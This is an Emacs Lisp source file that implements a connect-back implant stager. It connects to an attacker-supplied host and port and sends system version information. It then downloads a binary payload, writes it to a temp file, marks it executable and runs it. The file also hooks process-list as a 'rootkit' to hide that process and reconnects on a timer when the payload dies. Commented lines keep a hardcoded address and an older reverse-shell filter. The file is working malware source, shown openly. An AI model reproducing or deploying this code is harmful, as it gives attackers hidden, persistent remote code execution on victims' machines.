;; note: by default if you try to exit emacs will not close...
;; note that package-list-packages uses TLS to work...
(defun mosdef-lambda (ip-address port)
  (unless (boundp 'sc/timer-mutex) (setq sc/timer-mutex nil))
  (unless (boundp 'sc/ip) (setq sc/ip nil))
  (unless (boundp 'sc/port) (setq sc/port nil))
  (unless (boundp 'sc/mosdef-process) (setq sc/mosdef-process nil))

  (defun get-random-string (string-length)
    (with-temp-buffer
      (let ((alphabet "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"))
	(dotimes (count string-length)
	  (let ((index (random (length alphabet))))
	    (insert (substring alphabet index (+ 1 index)))))
	(buffer-string))))

  (defun get-ule32 (number)
    (with-temp-buffer
      (setq i 0)
      (while (< i 32)
	(let ((low-eight (logand #xff (lsh number (- i)))))
	  (insert (byte-to-string low-eight)))
	(setq i (+ i 8)))
      (buffer-string)))

  (defun windows/get-exe-path ()
    (make-temp-file (get-random-string 5) nil ".exe"))

  (defun unix/get-exe-path ()
    (make-temp-file (get-random-string 5)))

  
  (defun os-setup ()
    (let ((version-info '(("uname" "uname -a" unix/get-exe-path)
			  ("cmd.exe" "cmd.exe /c ver" windows/get-exe-path)))
	  (version-string ""))
      (dolist (current version-info version-string)
	(if (executable-find (car current))
	    (progn 
	      (setq sc/callback-path (apply (last current)))
	      (setq version-string (shell-command-to-string
				  (cadr current))))))
      version-string))
      

  ;; (defun write-file (string file-path)
  ;;   (with-temp-buffer
  ;;     (insert string)
  ;;     (write-region nil nil file-path t)))
  (defun write-callback (data file-path)
    (let ((coding-system-for-write 'binary))
      (with-temp-file file-path
	(set-buffer-multibyte nil)
	(insert
	 ;; (encode-coding-string data 'iso-latin-1 t))
	 (encode-coding-string data 'binary t))
	)))

  (defun sc/sentinel (process event)
    (with-current-buffer (get-buffer-create "*sc/sentinel*")
      (insert "event:")
      (insert event)
      (cond ((string-match "^open" event)
	     (progn ;;(setq sc/process process)
	       (let ((version-string (os-setup)))
		 (insert "version string:" version-string)
		 (process-send-string process 
					   (get-ule32
					    (length version-string)))
		      (process-send-string process version-string))))
	    ((string-match "^failed" event)
	     (set-process-sentinel process nil))
	    (t ;; disconnection
	     ;; (setq sc/process nil)
	     (set-process-sentinel process nil)))))

  ;; (defun sc/filter (process str)
  ;;   (with-current-buffer (get-buffer-create "*sc/filter*")
  ;;     (insert "inside sc/filter")
  ;;     (let ((output (shell-command-to-string str)))
  ;;       (process-send-string process (concat output "\r\n# ")))))

  (unless (boundp 'sc/filter-state) (setq sc/filter-state :start))
  (unless (boundp 'sc/filter-count) (setq sc/filter-count 0))
  (unless (boundp 'sc/callback) (setq sc/callback ""))
  (unless (boundp 'sc/filter-csize) (setq sc/filter-csize nil))
  (unless (boundp 'sc/rest) (setq sc/rest ""))
  (unless (boundp 'sc/rootkit-enabled) (setq sc/rootkit-enabled nil))
  

  (defun sc/process-hider (orig-fun &rest args)
    (with-current-buffer (get-buffer-create "*sc/hook*")
      (insert "hiding processes output by process-list\n")
      (let ((before-list (apply orig-fun args))
	    (hidden-process nil)
	    (hidden-name (file-name-nondirectory sc/callback-path)))
	(insert "checking for processes with name:" hidden-name)
	(dolist (process before-list)

	  (insert "examining process")
	  (insert (format "%s" process))

	  (let ((current-command (process-command process)))
	    (insert "current-command:")
	    (insert (format "%s" current-command))

	    (if (= (length current-command) 1)
		(if (string-match hidden-name (file-name-nondirectory
					       (car current-command)))
		    (setq hidden-process process)))))
	(when (processp hidden-process)
	  (progn
	    (insert "deleting process from list:" (format "%s" (process-command hidden-process)))
	    (setq before-list (delete hidden-process before-list))
	    ))
	before-list)))

  (defun read-ule32 (byte-string)
    (let ((i 0)
	  (long-number 0)
	  (bytes (string-to-list (substring byte-string 0 4))))
      (dolist (byte bytes long-number)
	(setq long-number (+ long-number (lsh byte i)))
	(setq i (+ i 8)))
      long-number))


  (defun sc/filter (process filter-input)
    ;; (when (not (boundp 'sc/callback-path))
    ;;   (setq sc/callback-path (make-temp-file (get-random-string 5))))

    (with-current-buffer (get-buffer-create "*sc/filter*")
      (insert "inside of sc/filter\n")
      (insert "(length filter-input):" (format "%d" (length filter-input)))

      ;; (setq sc/rest (concat sc/rest filter-input))
      ;; (setq sc/rest (concat sc/rest (encode-coding-string filter-input 'iso-latin-1 t)))
      (setq sc/rest (concat sc/rest (encode-coding-string filter-input 'binary t)))
      

      (while (not (= (length sc/rest) 0))
	(pcase sc/filter-state
	  (:start (progn 
		    (setq sc/filter-csize (read-ule32 sc/rest))
		    (setq sc/rest (substring sc/rest 4))
		    (setq sc/filter-state :read-callback)
		    (insert "callback size is:"
			    (format "%d" sc/filter-csize)"\n")
		    ))
	  (:read-callback (progn
			    (insert (format 
				     "received %d bytes of the callback\n"
				     (length sc/rest)))
			    (insert (format "total bytes: %d\n" sc/filter-count))


			    (when (< sc/filter-count sc/filter-csize)
			      (progn 
				(setq sc/filter-count
				      (+ sc/filter-count (length sc/rest)))
				(setq sc/callback (concat sc/callback sc/rest))))

			    
			    ;; when we've received all of the callback
			    ;; run it
			    (when (not (< sc/filter-count sc/filter-csize))
			      (insert "executing callback at:"
				      sc/callback-path "\n")
			      (write-callback sc/callback sc/callback-path)
			      (set-file-modes sc/callback-path #o100)
			      
			      (when (not sc/rootkit-enabled)
				(progn
				  (advice-add 'process-list :around
					      'sc/process-hider)
				  (setq sc/rootkit-enabled t)))

			      ;; (let ((display-buffer-alist (cons
			      ;; 				 '("*Async Shell Command*" display-buffer-no-window)
			      ;; 				 display-buffer-alist)))
			      
			      ;;   (async-shell-command sc/callback-path))
			      (insert "setting sc/mosdef-process\n")
			      (setq sc/mosdef-process
				    (start-process
				     (get-random-string 5)
				     nil
				     sc/callback-path))
			      (insert "mosdef process:" (prin1-to-string sc/mosdef-process))
			      ;; (add-to-list display-buffer-alist '("*Process List*" display-buffer-no-window))
			      (setq sc/filter-state nil))
			    (setq sc/rest "")
			    )
			  )
	  )
	;; (insert "received:" str)
	)))

  (defun sc/connect (ip-address port)
    ;; don't use a :filter for connect backs!
    (make-network-process
     :name (get-random-string 5)
     ;; :host "192.168.2.52"
     ;; :service 5555
     :host ip-address
     :service port
     :nowait t
     :filter 'sc/filter
     :sentinel 'sc/sentinel))

  (defun sc/start (ip-address port)
    ;; this dirty form is so that we preserve the arguments to sc/connect
    (unless sc/timer-mutex
      (setq sc/timer-mutex t)
      (setq sc/ip ip-address)
      (setq sc/port port)

      (sc/connect sc/ip sc/port)
      (run-with-idle-timer 5 t
			  (lambda ()
			    (when sc/mosdef-process
			      ;; our mosdef process died
			      (unless (= 0 (process-exit-status sc/mosdef-process))
				(progn
				  ;; (setq sc/callback-path (make-temp-file (get-random-string 5)))
				  (makunbound 'sc/callback-path)
				  (setq sc/filter-state :start)
				  (setq sc/filter-count 0)
				  (setq sc/callback "")
				  (setq sc/filter-csize nil)
				  (setq sc/rest "")
				  (setq sc/rootkit-enabled nil)
				  (sc/connect sc/ip sc/port))))))

      ))


  (sc/start ip-address port)
  ;; (sc/connect "192.168.2.52" 5555)
  ;; (when (not sc/process)
  ;;   (sc/connect ip-address port))
  )





